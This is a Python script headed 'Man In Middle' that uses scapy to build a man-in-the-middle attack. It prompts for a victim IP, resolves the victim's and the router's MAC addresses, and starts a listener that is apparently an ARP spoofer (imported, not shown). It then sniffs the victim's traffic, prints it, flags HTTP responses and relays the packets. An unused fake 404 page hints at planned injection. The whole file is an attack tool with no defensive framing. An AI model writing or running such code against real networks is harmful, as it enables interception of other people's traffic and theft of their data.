"""
    Guy Margalit
    Man In Middle
    06/02/2020
"""
from scapy.all import *
from netifaces import gateways
from src.Listener import Listener
from src.Sniffer import Sniffer


packets = []
victim_ip = ""
html = """<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>404</title>
        </head>
        <body>
            <p style="text-align:center;">
                404
                Page not found.
            </p>
        </body>
        </html>"""


def get_mac(ip):
    return sr1(ARP(op=1, pdst=ip))[ARP].hwsrc


def get_router(interface='default'):
    router_ip = list(gateways()[interface].values())[0][0]
    return router_ip, get_mac(router_ip)


def get_victim():
    global victim_ip
    victim_ip = input("Enter victim ip:\n")
    return victim_ip, get_mac(victim_ip)


def filt(p):
    global victim_ip
    return IP in p and (p[IP].dst == victim_ip or p[IP].src == victim_ip)


def http(p):
    return TCP in p and p[TCP].sport == 80


def prn(pack):
    global packets
    packets.append(pack)


def main():
    global packets
    listener = Listener(get_victim(), get_router())
    listener.start()
    sniffer = Sniffer(filt, prn)
    sniffer.start()
    while True:
        for p in packets:
            p.show()
            print("Received")
            if http(p):
                p.show()
                print("got it")
            send(p, verbose=0)
            packets.remove(p)


if __name__ == '__main__':
    main()
